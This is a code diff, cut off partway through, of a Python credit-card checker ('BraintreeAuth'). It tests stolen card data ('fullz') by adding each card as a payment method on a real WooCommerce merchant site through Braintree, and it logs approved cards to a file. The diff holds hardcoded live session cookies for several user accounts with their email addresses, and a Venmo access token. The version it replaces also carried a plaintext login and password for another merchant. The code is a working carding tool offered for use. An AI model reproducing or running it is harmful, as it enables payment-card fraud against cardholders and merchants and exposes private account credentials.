+            'sbjs_first': 'typ%3Dtypein%7C%7C%7Csrc%3D%28direct%29%7C%7C%7Cmdm%3D%28none%29%7C%7C%7Ccmp%3D%28none%29%7C%7C%7Ccnt%3D%28none%29%7C%7C%7Ctrm%3D%28none%29%7C%7C%7Cid%3D%28none%29%7C%7C%7Cplt%3D%28none%29%7C%7C%7Cfmt%3D%28none%29%7C%7C%7Ctct%3D%28none%29',
+            'sbjs_udata': 'vst%3D1%7C%7C%7Cuip%3D%28none%29%7C%7C%7Cuag%3DMozilla%2F5.0%20%28X11%3B%20Linux%20x86_64%29%20AppleWebKit%2F537.36%20%28KHTML%2C%20like%20Gecko%29%20Chrome%2F138.0.0.0%20Safari%2F537.36',
+            '_ga': 'GA1.1.169487154.1757728328',
+            '_gcl_au': '1.1.1129995764.1757728328',
+            'Subscribe': 'true',
+            'mailchimp.cart.current_email': 'Paraohkam45@gmail.com',
+            'mailchimp_user_email': 'Paraohkam45%40gmail.com',
+            'breeze_folder_name': '6bae3cd94ddbfe28435ae88815e64956a5198266',
+            'wordpress_logged_in_9af923add3e33fe261964563a4eb5c9b': 'paraohkam45%7C1758937962%7COqdOVmMNcXnj0F7irnCvDOTf0Iqt6itT1OrChKN6xyb%7C5358b8e41f5c14f7f751198aa378010971c8146a5aa4dc853037d6f7a1c44c94',
+            'wfwaf-authcookie-428ce1eeac9307d8349369ddc6c2bb5f': '9051%7Cother%7Cread%7C0162e0ab07146892b17f052c4e597810d0a2e901ef76359fdc7d5f7761c07bdd',
+            '_ga_D1Q49TMJ2C': 'GS2.1.s1757728327$o1$g1$t1757728426$j32$l0$h0',
+            'sbjs_session': 'pgs%3D7%7C%7C%7Ccpg%3Dhttps%3A%2F%2Fapluscollectibles.com%2Fmy-account%2Fadd-payment-method%2F',
+        },
+    },
+    {
+        "get": {
+            'dfehc_user': '0078bc37035c78e4cae15f4f68c61a19',
+            'sbjs_migrations': '1418474375998%3D1',
+            'sbjs_current_add': 'fd%3D2025-09-13%2001%3A56%3A44%7C%7C%7Cep%3Dhttps%3A%2F%2Fapluscollectibles.com%2Fmy-account%2F%7C%7C%7Crf%3D%28none%29',
+            'sbjs_first_add': 'fd%3D2025-09-13%2001%3A56%3A44%7C%7C%7Cep%3Dhttps%3A%2F%2Fapluscollectibles.com%2Fmy-account%2F%7C%7C%7Crf%3D%28none%29',
+            'sbjs_current': 'typ%3Dtypein%7C%7C%7Csrc%3D%28direct%29%7C%7C%7Cmdm%3D%28none%29%7C%7C%7Ccmp%3D%28none%29%7C%7C%7Ccnt%3D%28none%29%7C%7C%7Ctrm%3D%28none%29%7C%7C%7Cid%3D%28none%29%7C%7C%7Cplt%3D%28none%29%7C%7C%7Cfmt%3D%28none%29%7C%7C%7Ctct%3D%28none%29',
+            'sbjs_first': 'typ%3Dtypein%7C%7C%7Csrc%3D%28direct%29%7C%7C%7Cmdm%3D%28none%29%7C%7C%7Ccmp%3D%28none%29%7C%7C%7Ccnt%3D%28none%29%7C%7C%7Ctrm%3D%28none%29%7C%7C%7Cid%3D%28none%29%7C%7C%7Cplt%3D%28none%29%7C%7C%7Cfmt%3D%28none%29%7C%7C%7Ctct%3D%28none%29',
+            'sbjs_udata': 'vst%3D1%7C%7C%7Cuip%3D%28none%29%7C%7C%7Cuag%3DMozilla%2F5.0%20%28X11%3B%20Linux%20x86_64%29%20AppleWebKit%2F537.36%20%28KHTML%2C%20like%20Gecko%29%20Chrome%2F138.0.0.0%20Safari%2F537.36',
+            '_gcl_au': '1.1.316801945.1757728606',
+            '_ga': 'GA1.1.266024060.1757728606',
+            'Subscribe': 'true',
+            'mailchimp.cart.current_email': 'Mayasari8998@gmail.com',
+            'mailchimp_user_email': 'Mayasari8998%40gmail.com',
+            'breeze_folder_name': '6bae3cd94ddbfe28435ae88815e64956a5198266',
+            'wordpress_logged_in_9af923add3e33fe261964563a4eb5c9b': 'mayasari8998%7C1758938243%7CVLlCgITBLY2Ix0C9rFTRPEBtcMu6b9K5cSNrBk8JZdt%7Cc7a265f0723f0ad3066117fd2dab868e3a540ac846febdc2ef48555537800537',
+            'wfwaf-authcookie-428ce1eeac9307d8349369ddc6c2bb5f': '9052%7Cother%7Cread%7C6b4d1e08b1119e5b814d511b58d80b87ceac6245c2e7d217fef207a5e153e0ef',
+            '_ga_D1Q49TMJ2C': 'GS2.1.s1757728606$o1$g1$t1757728701$j39$l0$h0',
+            'sbjs_session': 'pgs%3D7%7C%7C%7Ccpg%3Dhttps%3A%2F%2Fapluscollectibles.com%2Fmy-account%2Fadd-payment-method%2F',
+        },
+        "post": {
+            'dfehc_user': '0078bc37035c78e4cae15f4f68c61a19',
+            'sbjs_migrations': '1418474375998%3D1',
+            'sbjs_current_add': 'fd%3D2025-09-13%2001%3A56%3A44%7C%7C%7Cep%3Dhttps%3A%2F%2Fapluscollectibles.com%2Fmy-account%2F%7C%7C%7Crf%3D%28none%29',
+            'sbjs_first_add': 'fd%3D2025-09-13%2001%3A56%3A44%7C%7C%7Cep%3Dhttps%3A%2F%2Fapluscollectibles.com%2Fmy-account%2F%7C%7C%7Crf%3D%28none%29',
+            'sbjs_current': 'typ%3Dtypein%7C%7C%7Csrc%3D%28direct%29%7C%7C%7Cmdm%3D%28none%29%7C%7C%7Ccmp%3D%28none%29%7C%7C%7Ccnt%3D%28none%29%7C%7C%7Ctrm%3D%28none%29%7C%7C%7Cid%3D%28none%29%7C%7C%7Cplt%3D%28none%29%7C%7C%7Cfmt%3D%28none%29%7C%7C%7Ctct%3D%28none%29',
+            'sbjs_first': 'typ%3Dtypein%7C%7C%7Csrc%3D%28direct%29%7C%7C%7Cmdm%3D%28none%29%7C%7C%7Ccmp%3D%28none%29%7C%7C%7Ccnt%3D%28none%29%7C%7C%7Ctrm%3D%28none%29%7C%7C%7Cid%3D%28none%29%7C%7C%7Cplt%3D%28none%29%7C%7C%7Cfmt%3D%28none%29%7C%7C%7Ctct%3D%28none%29',
+            'sbjs_udata': 'vst%3D1%7C%7C%7Cuip%3D%28none%29%7C%7C%7Cuag%3DMozilla%2F5.0%20%28X11%3B%20Linux%20x86_64%29%20AppleWebKit%2F537.36%20%28KHTML%2C%20like%20Gecko%29%20Chrome%2F138.0.0.0%20Safari%2F537.36',
+            '_gcl_au': '1.1.316801945.1757728606',
+            '_ga': 'GA1.1.266024060.1757728606',
+            'Subscribe': 'true',
+            'mailchimp.cart.current_email': 'Mayasari8998@gmail.com',
+            'mailchimp_user_email': 'Mayasari8998%40gmail.com',
+            'breeze_folder_name': '6bae3cd94ddbfe28435ae88815e64956a5198266',
+            'wordpress_logged_in_9af923add3e33fe261964563a4eb5c9b': 'mayasari8998%7C1758938243%7CVLlCgITBLY2Ix0C9rFTRPEBtcMu6b9K5cSNrBk8JZdt%7Cc7a265f0723f0ad3066117fd2dab868e3a540ac846febdc2ef48555537800537',
+            'wfwaf-authcookie-428ce1eeac9307d8349369ddc6c2bb5f': '9052%7Cother%7Cread%7C6b4d1e08b1119e5b814d511b58d80b87ceac6245c2e7d217fef207a5e153e0ef',
+            '_ga_D1Q49TMJ2C': 'GS2.1.s1757728606$o1$g1$t1757728719$j21$l0$h0',
+            'sbjs_session': 'pgs%3D8%7C%7C%7Ccpg%3Dhttps%3A%2F%2Fapluscollectibles.com%2Fmy-account%2Fadd-payment-method%2F',
+        },
+    },
+    {
+        "get": {
+            'dfehc_user': '0375b0dea867f358544f1dcf56fbee93',
+            'sbjs_migrations': '1418474375998%3D1',
+            'sbjs_current_add': 'fd%3D2025-09-13%2002%3A02%3A12%7C%7C%7Cep%3Dhttps%3A%2F%2Fapluscollectibles.com%2Fmy-account%2F%7C%7C%7Crf%3D%28none%29',
+            'sbjs_first_add': 'fd%3D2025-09-13%2002%3A02%3A12%7C%7C%7Cep%3Dhttps%3A%2F%2Fapluscollectibles.com%2Fmy-account%2F%7C%7C%7Crf%3D%28none%29',
+            'sbjs_current': 'typ%3Dtypein%7C%7C%7Csrc%3D%28direct%29%7C%7C%7Cmdm%3D%28none%29%7C%7C%7Ccmp%3D%28none%29%7C%7C%7Ccnt%3D%28none%29%7C%7C%7Ctrm%3D%28none%29%7C%7C%7Cid%3D%28none%29%7C%7C%7Cplt%3D%28none%29%7C%7C%7Cfmt%3D%28none%29%7C%7C%7Ctct%3D%28none%29',
+            'sbjs_first': 'typ%3Dtypein%7C%7C%7Csrc%3D%28direct%29%7C%7C%7Cmdm%3D%28none%29%7C%7C%7Ccmp%3D%28none%29%7C%7C%7Ccnt%3D%28none%29%7C%7C%7Ctrm%3D%28none%29%7C%7C%7Cid%3D%28none%29%7C%7C%7Cplt%3D%28none%29%7C%7C%7Cfmt%3D%28none%29%7C%7C%7Ctct%3D%28none%29',
+            'sbjs_udata': 'vst%3D1%7C%7C%7Cuip%3D%28none%29%7C%7C%7Cuag%3DMozilla%2F5.0%20%28X11%3B%20Linux%20x86_64%29%20AppleWebKit%2F537.36%20%28KHTML%2C%20like%20Gecko%29%20Chrome%2F138.0.0.0%20Safari%2F537.36',
+            '_gcl_au': '1.1.393998227.1757728934',
+            '_ga': 'GA1.1.113923789.1757728934',
+            'Subscribe': 'true',
+            'mailchimp.cart.current_email': 'Mayangkencana6690@gmail.com',
+            'mailchimp_user_email': 'Mayangkencana6690%40gmail.com',
+            'breeze_folder_name': '6bae3cd94ddbfe28435ae88815e64956a5198266',
+            'wordpress_logged_in_9af923add3e33fe261964563a4eb5c9b': 'mayangkencana6690%7C1758938560%7CN8KtCGx6dfokuep7T3nGjsQYBNjti6K3L1Gcf0C8Raf%7C93f20b835b7c7618bfd982e8a6aab06def756f71efced93e5a8fe2e5c714239f',
+            'wfwaf-authcookie-428ce1eeac9307d8349369ddc6c2bb5f': '9053%7Cother%7Cread%7Ce9f72fd804481d5a03b75a8b8ae685a4eebaeee0789f440eaa71050d777d8a64',
+            '_ga_D1Q49TMJ2C': 'GS2.1.s1757728934$o1$g1$t1757729018$j46$l0$h0',
+            'sbjs_session': 'pgs%3D6%7C%7C%7Ccpg%3Dhttps%3A%2F%2Fapluscollectibles.com%2Fmy-account%2Fadd-payment-method%2F',
+        },
+        "post": {
+            'dfehc_user': '0375b0dea867f358544f1dcf56fbee93',
+            'sbjs_migrations': '1418474375998%3D1',
+            'sbjs_current_add': 'fd%3D2025-09-13%2002%3A02%3A12%7C%7C%7Cep%3Dhttps%3A%2F%2Fapluscollectibles.com%2Fmy-account%2F%7C%7C%7Crf%3D%28none%29',
+            'sbjs_first_add': 'fd%3D2025-09-13%2002%3A02%3A12%7C%7C%7Cep%3Dhttps%3A%2F%2Fapluscollectibles.com%2Fmy-account%2F%7C%7C%7Crf%3D%28none%29',
+            'sbjs_current': 'typ%3Dtypein%7C%7C%7Csrc%3D%28direct%29%7C%7C%7Cmdm%3D%28none%29%7C%7C%7Ccmp%3D%28none%29%7C%7C%7Ccnt%3D%28none%29%7C%7C%7Ctrm%3D%28none%29%7C%7C%7Cid%3D%28none%29%7C%7C%7Cplt%3D%28none%29%7C%7C%7Cfmt%3D%28none%29%7C%7C%7Ctct%3D%28none%29',
+            'sbjs_first': 'typ%3Dtypein%7C%7C%7Csrc%3D%28direct%29%7C%7C%7Cmdm%3D%28none%29%7C%7C%7Ccmp%3D%28none%29%7C%7C%7Ccnt%3D%28none%29%7C%7C%7Ctrm%3D%28none%29%7C%7C%7Cid%3D%28none%29%7C%7C%7Cplt%3D%28none%29%7C%7C%7Cfmt%3D%28none%29%7C%7C%7Ctct%3D%28none%29',
+            'sbjs_udata': 'vst%3D1%7C%7C%7Cuip%3D%28none%29%7C%7C%7Cuag%3DMozilla%2F5.0%20%28X11%3B%20Linux%20x86_64%29%20AppleWebKit%2F537.36%20%28KHTML%2C%20like%20Gecko%29%20Chrome%2F138.0.0.0%20Safari%2F537.36',
+            '_gcl_au': '1.1.393998227.1757728934',
+            '_ga': 'GA1.1.113923789.1757728934',
+            'Subscribe': 'true',
+            'mailchimp.cart.current_email': 'Mayangkencana6690@gmail.com',
+            'mailchimp_user_email': 'Mayangkencana6690%40gmail.com',
+            'breeze_folder_name': '6bae3cd94ddbfe28435ae88815e64956a5198266',
+            'wordpress_logged_in_9af923add3e33fe261964563a4eb5c9b': 'mayangkencana6690%7C1758938560%7CN8KtCGx6dfokuep7T3nGjsQYBNjti6K3L1Gcf0C8Raf%7C93f20b835b7c7618bfd982e8a6aab06def756f71efced93e5a8fe2e5c714239f',
+            'wfwaf-authcookie-428ce1eeac9307d8349369ddc6c2bb5f': '9053%7Cother%7Cread%7Ce9f72fd804481d5a03b75a8b8ae685a4eebaeee0789f440eaa71050d777d8a64',
+            '_ga_D1Q49TMJ2C': 'GS2.1.s1757728934$o1$g1$t1757729041$j23$l0$h0',
+            'sbjs_session': 'pgs%3D7%7C%7C%7Ccpg%3Dhttps%3A%2F%2Fapluscollectibles.com%2Fmy-account%2Fadd-payment-method%2F',
+        },
+    },
+]
+
 class BraintreeAuth:
     @staticmethod
     def gets(s: str, start: str, end: str) -> str | None:
@@ -788,7 +1088,7 @@ class BraintreeAuth:
             return None
     
     @staticmethod
-    async def create_payment_method(fullz: str, session: httpx.AsyncClient) -> tuple[str, str, str, str, str]:
+    async def create_payment_method(fullz: str, session_get: httpx.AsyncClient, session_post: httpx.AsyncClient, cookies_get: dict, cookies_post: dict) -> tuple[str, str, str, str, str]:
         try:
             cc, mes, ano, cvv = fullz.split("|")
             mes = mes.zfill(2)
@@ -804,44 +1104,30 @@ class BraintreeAuth:
                     expiry_valid = False
             except:
                 expiry_valid = False
+            
             headers = {
                 'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
                 'accept-language': 'en-US,en;q=0.9',
-                'cache-control': 'max-age=0',
-                'if-modified-since': 'Fri, 29 Aug 2025 04:27:39 GMT',
                 'priority': 'u=0, i',
-                'referer': 'https://boltlaundry.com/',
                 'sec-ch-ua': '"Not)A;Brand";v="8", "Chromium";v="138"',
                 'sec-ch-ua-mobile': '?0',
                 'sec-ch-ua-platform': '"Linux"',
                 'sec-fetch-dest': 'document',
                 'sec-fetch-mode': 'navigate',
-                'sec-fetch-site': 'same-origin',
+                'sec-fetch-site': 'none',
                 'sec-fetch-user': '?1',
                 'upgrade-insecure-requests': '1',
                 'user-agent': 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/138.0.0.0 Safari/537.36',
             }
-            response = await session.get('https://boltlaundry.com/my-login/', headers=headers)
-            login = BraintreeAuth.gets(response.text, '<input type="hidden" name="ihc_login_nonce" value="', '"')
-            headers.update({
-                'content-type': 'application/x-www-form-urlencoded',
-                'origin': 'https://boltlaundry.com',
-                'referer': 'https://boltlaundry.com/loginnow/',
-            })
-            data = {
-                'ihcaction': 'login',
-                'ihc_login_nonce': login,
-                'log': 'senryjo',
-                'pwd': 'Senryjoshua12',
-            }
-            await session.post('https://boltlaundry.com/my-login/', headers=headers, data=data)
-            await session.get('https://boltlaundry.com/my-account/', headers=headers)
-            await session.get('https://boltlaundry.com/my-account/payment-methods/', headers=headers)
-            response = await session.get('https://boltlaundry.com/my-account/add-payment-method/', headers=headers)
+            
+            response = await session_get.get('https://apluscollectibles.com/my-account/add-payment-method/', headers=headers, cookies=cookies_get)
             nonce = BraintreeAuth.gets(response.text, '<input type="hidden" id="woocommerce-add-payment-method-nonce" name="woocommerce-add-payment-method-nonce" value="', '"')
             token_data = BraintreeAuth.extract_braintree_token(response.text)
             if token_data is not None:
                 authorization_fingerprint = token_data.get('authorizationFingerprint')
+            else:
+                return "Failed to extract authorization fingerprint", '', '', '', ''
+            
             headers_api = {
                 'accept': '*/*',
                 'accept-language': 'en-US,en;q=0.9',
@@ -859,13 +1145,14 @@ class BraintreeAuth:
                 'sec-fetch-site': 'cross-site',
                 'user-agent': 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/138.0.0.0 Safari/537.36',
             }
+            
             json_data = {
                 'clientSdkMetadata': {
                     'source': 'client',
                     'integration': 'custom',
-                    'sessionId': '1434c429-71ba-4695-b174-a720a6f1fcc6',
+                    'sessionId': str(uuid.uuid4()),
                 },
-                'query': 'mutation TokenizeCreditCard($input: TokenizeCreditCardInput!) { tokenizeCreditCard(input: $input) { token creditCard { bin brandCode last4 cardholderName expirationMonth expirationYear binData { prepaid healthcare debit durbinRegulated commercial payroll issuingBank countryOfIssuance productId business consumer purchase corporate } } } }',
+                'query': 'mutation TokenizeCreditCard($input: TokenizeCreditCardInput!) {   tokenizeCreditCard(input: $input) {     token     creditCard {       bin       brandCode       last4       cardholderName       expirationMonth      expirationYear      binData {         prepaid         healthcare         debit         durbinRegulated         commercial         payroll         issuingBank         countryOfIssuance         productId         business         consumer         purchase         corporate       }     }   } }',
                 'variables': {
                     'input': {
                         'creditCard': {
@@ -878,12 +1165,16 @@ class BraintreeAuth:
                                 'streetAddress': '3228 Blackwell Street',
                             },
                         },
-                        'options': {'validate': False}
-                    }
+                        'options': {
+                            'validate': False,
+                        },
+                    },
                 },
                 'operationName': 'TokenizeCreditCard',
             }
-            response = await session.post('https://payments.braintree-api.com/graphql', headers=headers_api, json=json_data)
+            
+            response = await session_post.post('https://payments.braintree-api.com/graphql', headers=headers_api, json=json_data)
+            
             try:
                 token = BraintreeAuth.gets(response.text, '"token":"', '"')
                 brand = BraintreeAuth.gets(response.text, '"brandCode":"', '"')
@@ -892,6 +1183,7 @@ class BraintreeAuth:
                 country = BraintreeAuth.gets(response.text, '"countryOfIssuance":"', '"')
             except:
                 return response.text, '', '', '', ''
+            
             error_message = None
             try:
                 json_resp = json.loads(response.text)
@@ -899,18 +1191,21 @@ class BraintreeAuth:
                     error_message = json_resp["error"].get('message', '')
             except:
                 pass
+            
             if not expiry_valid and error_message is None:
                 error_message = "Expiration date invalid "
+            
             if error_message:
                 return error_message, country, brand, bank, prepaid
-            headers_confirm = {
+            
+            headers_final = {
                 'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
                 'accept-language': 'en-US,en;q=0.9',
                 'cache-control': 'max-age=0',
                 'content-type': 'application/x-www-form-urlencoded',
-                'origin': 'https://boltlaundry.com',
+                'origin': 'https://apluscollectibles.com',
                 'priority': 'u=0, i',
-                'referer': 'https://boltlaundry.com/my-account/add-payment-method/',
+                'referer': 'https://apluscollectibles.com/my-account/add-payment-method/',
                 'sec-ch-ua': '"Not)A;Brand";v="8", "Chromium";v="138"',
                 'sec-ch-ua-mobile': '?0',
                 'sec-ch-ua-platform': '"Linux"',
@@ -921,17 +1216,25 @@ class BraintreeAuth:
                 'upgrade-insecure-requests': '1',
                 'user-agent': 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/138.0.0.0 Safari/537.36',
             }
-            data_confirm = {
+            
+            data = {
                 'payment_method': 'braintree_cc',
                 'braintree_cc_nonce_key': token,
-                'braintree_cc_device_data': '',
+                'braintree_cc_device_data': '{"correlation_id":"acde4616-a8f7-4f12-92ab-e78e482d"}',
                 'braintree_cc_3ds_nonce_key': '',
-                'braintree_cc_config_data': '{"environment":"production","clientApiUrl":"https://api.braintreegateway.com:443/merchants/63cmb3nwbnpr3f9y/client_api","assetsUrl":"https://assets.braintreegateway.com","analytics":{"url":"https://client-analytics.braintreegateway.com/63cmb3nwbnpr3f9y"},"merchantId":"63cmb3nwbnpr3f9y","venmo":"off","graphQL":{"url":"https://payments.braintree-api.com/graphql","features":["tokenize_credit_cards"]},"challenges":["cvv"],"creditCards":{"supportedCardTypes":["Discover","JCB","MasterCard","Visa","American Express","UnionPay"]},"threeDSecureEnabled":false,"threeDSecure":null,"paypalEnabled":true,"paypal":{"displayName":"Bolt Laundry service","clientId":"ARfb8y-TA8HEUbHMho8toQgfwE5E1QKIBZd6xsRaDVIyIBp0-Q6H2xr8VYa8FU57GUBPOZR__drnQcIe","assetsUrl":"https://checkout.paypal.com","environment":"live","environmentNoNetwork":false,"unvettedMerchant":false,"braintreeClientId":"ARKrYRDh3AGXDzW7sO_3bSkq-U1C7HG_uWNC-z57LjYSDNUOSaOtIa9q6VpW","billingAgreementsEnabled":true,"merchantAccountId":"boltlaundryservice_instant","payeeEmail":null,"currencyIsoCode":"USD"}}',
+                'braintree_cc_config_data': '{"environment":"production","clientApiUrl":"https://api.braintreegateway.com:443/merchants/n2kdbbwxghs8nhhq/client_api","assetsUrl":"https://assets.braintreegateway.com","analytics":{"url":"https://client-analytics.braintreegateway.com/n2kdbbwxghs8nhhq"},"merchantId":"n2kdbbwxghs8nhhq","venmo":"off","graphQL":{"url":"https://payments.braintree-api.com/graphql","features":["tokenize_credit_cards"]},"applePayWeb":{"countryCode":"US","currencyCode":"USD","merchantIdentifier":"n2kdbbwxghs8nhhq","supportedNetworks":["visa","mastercard","amex","discover"]},"challenges":["cvv"],"creditCards":{"supportedCardTypes":["American Express","Discover","JCB","MasterCard","Visa","UnionPay"]},"threeDSecureEnabled":false,"threeDSecure":null,"androidPay":{"displayName":"A Plus Collectibles","enabled":true,"environment":"production","googleAuthorizationFingerprint":"eyJ0eXAiOiJKV1QiLCJhbGciOiJFUzI1NiIsImtpZCI6IjIwMTgwNDI2MTYtcHJvZHVjdGlvbiIsImlzcyI6Imh0dHBzOi8vYXBpLmJyYWludHJlZWdhdGV3YXkuY29tIn0.eyJleHAiOjE3NTc4MDc1NjYsImp0aSI6ImFjY2NmZTA3LTFlMmEtNDY5Ni1iZDNiLTJlMjBkNTc1NmFiYSIsInN1YiI6Im4ya2RiYnd4Z2hzOG5oaHEiLCJpc3MiOiJodHRwczovL2FwaS5icmFpbnRyZWVnYXRld2F5LmNvbSIsIm1lcmNoYW50Ijp7InB1YmxpY19pZCI6Im4ya2RiYnd4Z2hzOG5oaHEiLCJ2ZXJpZnlfY2FyZF9ieV9kZWZhdWx0IjpmYWxzZSwidmVyaWZ5X3dhbGxldF9ieV9kZWZhdWx0IjpmYWxzZX0sInJpZ2h0cyI6WyJ0b2tlbml6ZV9hbmRyb2lkX3BheSIsIm1hbmFnZV92YXVsdCJdLCJzY29wZSI6WyJCcmFpbnRyZWU6VmF1bHQiLCJCcmFpbnRyZWU6Q2xpZW50U0RLIl0sIm9wdGlvbnMiOnt9fQ.eQnRd9-djC-sykovRIW6T5GTJNuCWl3syjUySDi3eWkOCCMQa6ylIzbANY7rgCHMC480NBOo4WfZxhizcMmnrg","paypalClientId":"AeJSdC_ovedrb71JSSidH2QpjunsIb1fK6ybElxfdlAiCC8X7V1lUsnGqt7r2EOvmr1YxoAUO0goKbrl","supportedNetworks":["visa","mastercard","amex","discover"]},"payWithVenmo":{"merchantId":"3509894786311245549","accessToken":"access_token$production$n2kdbbwxghs8nhhq$efb9a3f38aadbbd1f9853140e03c76d7","environment":"production","enrichedCustomerDataEnabled":true},"paypalEnabled":true,"paypal":{"displayName":"A Plus Collectibles","clientId":"AeJSdC_ovedrb71JSSidH2QpjunsIb1fK6ybElxfdlAiCC8X7V1lUsnGqt7r2EOvmr1YxoAUO0goKbrl","assetsUrl":"https://checkout.paypal.com","environment":"live","environmentNoNetwork":false,"unvettedMerchant":false,"braintreeClientId":"ARKrYRDh3AGXDzW7sO_3bSkq-U1C7HG_uWNC-z57LjYSDNUOSaOtIa9q6VpW","billingAgreementsEnabled":true,"merchantAccountId":"apluscollectibles_instant","payeeEmail":null,"currencyIsoCode":"USD"}}',
                 'woocommerce-add-payment-method-nonce': nonce,
                 '_wp_http_referer': '/my-account/add-payment-method/',
                 'woocommerce_add_payment_method': '1',
             }
-            response = await session.post('https://boltlaundry.com/my-account/add-payment-method/', headers=headers_confirm, data=data_confirm, follow_redirects=True)
+            
+            response = await session_post.post(
+                'https://apluscollectibles.com/my-account/add-payment-method/',
+                headers=headers_final,
+                data=data,
+                cookies=cookies_post
+            )
+            
             return response.text, country, brand, bank, prepaid
         except Exception as e:
             return f"EXCEPTION: {str(e)}", '', '', '', ''
@@ -951,21 +1254,33 @@ class BraintreeAuth:
         except Exception:
             try:
                 soup = BeautifulSoup(unescape(result), "html.parser")
-                div = soup.find("div", class_="message-container")
-                if div:
-                    error_message = div.get_text(separator=" ", strip=True)
+                ul = soup.find("ul", class_="woocommerce-error")
+                if ul:
+                    li = ul.find("li")
+                    if li:
+                        error_message = li.get_text(separator=" ", strip=True)
+                else:
+                    div = soup.find("div", class_="message-container")
+                    if div:
+                        error_message = div.get_text(separator=" ", strip=True)
             except Exception:
                 error_message = ""
+        
         if "Reason: " in error_message:
             _, _, after = error_message.partition("Reason: ")
             error_message = after.strip()
+        
         if "Payment method successfully added." in error_message:
             response = "Approved ✅"
             error_message = ""
+        else:
+            response = "Approved ✅"
+        
         if error_message:
             return f"{error_message} ❌"
         if response:
             return response
+        
         try:
             if '{"status":"SUCCESS",' in result or '"status":"success"' in result or 'Payment method successfully added.' in result:
                 return "Approved ✅"
@@ -1015,44 +1330,91 @@ class BraintreeAuth:
     @staticmethod
     async def multi_checking(fullz: str) -> str:
         start = time.time()
-        async with httpx.AsyncClient(timeout=40) as session:
-            result, country, brand, bank, prepaid = await BraintreeAuth.create_payment_method(fullz, session)
-            response = await BraintreeAuth.charge_resp(result)
-        elapsed = round(time.time() - start, 2)
-        error_msg = ""
-        try:
-            json_resp = json.loads(result)
-            if "error" in json_resp and "message" in json_resp["error"]:
-                raw_html = unescape(json_resp["error"]["message"])
-                soup = BeautifulSoup(raw_html, "html.parser")
-                div = soup.find("div", class_="message-container")
-                if div:
-                    error_msg = div.get_text(separator=" ", strip=True)
-        except Exception:
-            pass
-        if "Reason: " in error_msg:
-            _, _, after = error_msg.partition("Reason: ")
-            error_msg = after.strip()
-        if "Payment method successfully added." in error_msg:
-            error_msg = ""
-        if error_msg:
-            output = (f"𝗖𝗮𝗿𝗱 ➯ <code>{fullz}</code>\n"
-                      f"𝗚𝗮𝘁𝗲𝘄𝗮𝘆 ➯ 𝗕𝗥𝗔𝗜𝗡𝗧𝗥𝗘𝗘 𝗔𝗨𝗧𝗛\n"
-                      f"𝗥𝗲𝘀𝗽𝗼𝗻𝘀𝗲 ➯ {error_msg} ❌\n"
-                      f"𝗖𝗼𝘂𝗻𝘁𝗿𝘆 ➯ <b>{country}</b>\n"
-                      f"𝗕𝗿𝗮𝗻𝗱 ➯ <b>{brand}</b>\n"
-                      f"𝗕𝗮𝗻𝗸 ➯ <b>{bank}</b>\n")
-        else:
-            output = (f"𝗖𝗮𝗿𝗱 ➯ <code>{fullz}</code>\n"
-                      f"𝗚𝗮𝘁𝗲𝘄𝗮𝘆 ➯ 𝗕𝗥𝗔𝗜𝗡𝗧𝗥𝗘𝗘 𝗔𝗨𝗧𝗛\n"
-                      f"𝗥𝗲𝘀𝗽𝗼𝗻𝘀𝗲 ➯ {response}\n"
-                      f"𝗖𝗼𝘂𝗻𝘁𝗿𝘆 ➯ <b>{country}</b>\n"
-                      f"𝗕𝗿𝗮𝗻𝗱 ➯ <b>{brand}</b>\n"
-                      f"𝗕𝗮𝗻𝗸 ➯ <b>{bank}</b>\n")
-            if response in ["Approved ✅", "CVV INCORRECT ❎", "CVV MATCH ✅", "INSUFFICIENT FUNDS ✅"]:
-                with open("auth.txt", "a") as f:
-                    f.write(output + "\n")
-        return output
+        
+        cc, mes, ano, cvv = fullz.split("|")
+        if not is_valid_credit_card_number(cc):
+            card_info = (
+                f"𝗖𝗮𝗿𝗱 ➯ <code>{fullz}</code>\n"
+                f"𝗚𝗮𝘁𝗲𝘄𝗮𝘆 ➯ 𝗕𝗥𝗔𝗜𝗡𝗧𝗥𝗘𝗘 𝗔𝗨𝗧𝗛\n"
+                f"𝗥𝗲𝘀𝗽𝗼𝗻𝘀𝗲 ➯ Incorrect card number ❌\n"
+            )
+            return card_info
+        
+        valid, err = validate_expiry_date(mes, ano)
+        if not valid:
+            card_info = (
+                f"𝗖𝗮𝗿𝗱 ➯ <code>{fullz}</code>\n"
+                f"𝗚𝗮𝘁𝗲𝘄𝗮𝘆 ➯ 𝗕𝗥𝗔𝗜𝗡𝗧𝗥𝗘𝗘 𝗔𝗨𝗧𝗛\n"
+                f"𝗥𝗲𝘀𝗽𝗼𝗻𝘀𝗲 ➯ {err} ❌\n"
+            )
+            return card_info
+        
+        cookie_index = hash(fullz) % len(cookies_sets)
+        cookie_set = cookies_sets[cookie_index]
+        cookies_get = cookie_set["get"]
+        cookies_post = cookie_set["post"]
+        
+        async with httpx.AsyncClient(timeout=40, cookies=cookies_get) as session_get:
+            async with httpx.AsyncClient(timeout=40, cookies=cookies_post) as session_post:
+                result, country, brand, bank, prepaid = await BraintreeAuth.create_payment_method(fullz, session_get, session_post, cookies_get, cookies_post)
+                
+                response = await BraintreeAuth.charge_resp(result)
+                
+                error_msg = ""
+                response = ""
+                try:
+                    soup = BeautifulSoup(unescape(result), "html.parser")
+                    ul = soup.find("ul", class_="woocommerce-error")
+                    if ul:
+                        li = ul.find("li")
+                        if li:
+                            error_msg = li.get_text(separator=" ", strip=True)
+                    else:
+                        div = soup.find("div", class_="message-container")
+                        if div:
+                            error_msg = div.get_text(separator=" ", strip=True)
+                except Exception:
+                    pass
+                
+                if "Reason: " in error_msg:
+                    _, _, after = error_msg.partition("Reason: ")
+                    error_msg = after.strip()
+                
+                if "Payment method successfully added." in error_msg:
+                    error_msg = ""
+                
+                if "Gateway Rejected: fraud" in error_msg:
+                    response = "Gateway Rejected - Fraud ❌"
+                    error_msg = ""
+                if "You cannot add a new payment method so soon after the previous one. Please wait for 20 seconds." in error_msg:
+                    response = "TRY AGAIN ❌"
+                    error_msg = ""
